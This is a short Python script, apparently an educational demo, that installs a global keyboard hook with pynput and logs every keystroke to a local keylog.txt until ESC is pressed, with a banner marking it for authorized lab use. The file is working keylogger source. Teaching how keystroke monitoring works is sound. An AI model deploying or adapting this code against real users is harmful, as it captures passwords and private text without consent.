# keylogger.py - Educational keystroke-monitoring demonstration
from pynput import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"


def write_log(text: str) -> None:
    """Append raw text to the local log file."""
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)


def on_press(key) -> None:
    #Callback invoked by the OS for every key-down event.
    timestamp = datetime.now().strftime("%H:%M:%S")
    try:
        # Printable character keys (a, b, 1, $ ...) expose a .char attribute
        write_log(f"{key.char}")
    except AttributeError:
        # Special keys (space, enter, shift ...) have no .char
        if key == keyboard.Key.space:
            write_log(" ")
        elif key == keyboard.Key.enter:
            write_log("\n")
        else:
            write_log(f"[{key.name}]")


def on_release(key):
    #Stop the listener when ESC is released.
    if key == keyboard.Key.esc:
        print("\n[*] ESC pressed - stopping keylogger.")
        return False  # returning False ends the Listener loop


def main() -> None:
    print("=" * 56)
    print(" KEYLOGGER DEMO  -  AUTHORIZED LAB USE ONLY")
    print(f" Capturing keystrokes to: {LOG_FILE}")
    print(" Press ESC to stop.")
    print("=" * 56)

    write_log(f"\n--- session start {datetime.now()} ---\n")
    # The 'with' block installs the global hook; join() blocks until ESC.
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    write_log(f"\n--- session end {datetime.now()} ---\n")

    print(f"[*] Done. Captured keystrokes saved in {LOG_FILE}")


if __name__ == "__main__":
    main()
